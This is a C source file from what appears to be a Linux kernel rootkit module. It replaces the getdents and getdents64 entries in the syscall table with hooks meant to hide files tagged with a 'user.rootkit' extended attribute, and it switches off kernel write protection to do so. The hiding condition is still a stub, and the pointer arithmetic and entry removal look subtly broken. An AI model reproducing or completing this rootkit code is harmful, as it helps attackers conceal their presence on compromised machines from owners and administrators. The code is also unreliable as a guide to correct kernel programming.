#include <linux/stddef.h>
#include <linux/kernel.h>
#include <linux/export.h>
#include <linux/time.h>
#include <linux/mm.h>
#include <linux/errno.h>
#include <linux/stat.h>
#include <linux/file.h>
#include <linux/fs.h>
#include <linux/fsnotify.h>
#include <linux/dirent.h>
#include <linux/security.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>

#include "filehide.h"
#include "hook.h"

struct linux_dirent {
    unsigned long  d_ino;
    unsigned long  d_off;
    unsigned short d_reclen;
    char           d_name[];
};

void
hide_files(void)
{
    disable_protection();
    sys_calls[__NR_getdents] = (void *)filehide_getdents;
    sys_calls[__NR_getdents64] = (void *)filehide_getdents64;
    enable_protection();
}

void
unhide_files(void)
{
    disable_protection();
    sys_calls[__NR_getdents] = (void *)sys_getdents;
    sys_calls[__NR_getdents64] = (void *)sys_getdents64;
    enable_protection();
}

// https://elixir.bootlin.com/linux/v4.4.19/source/fs/readdir.c#L197
asmlinkage long
filehide_getdents(unsigned fd, struct linux_dirent __user *dirent, unsigned count)
{
    typedef struct linux_dirent *dirent_ptr_t;

    long ret = sys_getdents(fd, dirent, count);

    if (ret < 0)
        return ret;

    for (long offset = 0; offset < ret;) {
        dirent_ptr_t cur_dirent = (dirent_ptr_t)((char *)dirent) + offset;

        if (false) // TODO: xattrs user.rootkit = rootkit
            ret -= cur_dirent->d_reclen;
        else
            offset += cur_dirent->d_reclen;
    }

    return ret;
}

// https://elixir.bootlin.com/linux/v4.4.19/source/fs/readdir.c#L278
asmlinkage long
filehide_getdents64(unsigned fd, struct linux_dirent64 __user *dirent, unsigned count)
{
    typedef struct linux_dirent64 *dirent64_ptr_t;

    long ret = sys_getdents64(fd, dirent, count);

    if (ret < 0)
        return ret;

    for (long offset = 0; offset < ret;) {
        dirent64_ptr_t cur_dirent = (dirent64_ptr_t)((char *)dirent) + offset;

        if (false) // TODO: xattrs user.rootkit = rootkit
            ret -= cur_dirent->d_reclen;
        else
            offset += cur_dirent->d_reclen;
    }

    return ret;
}
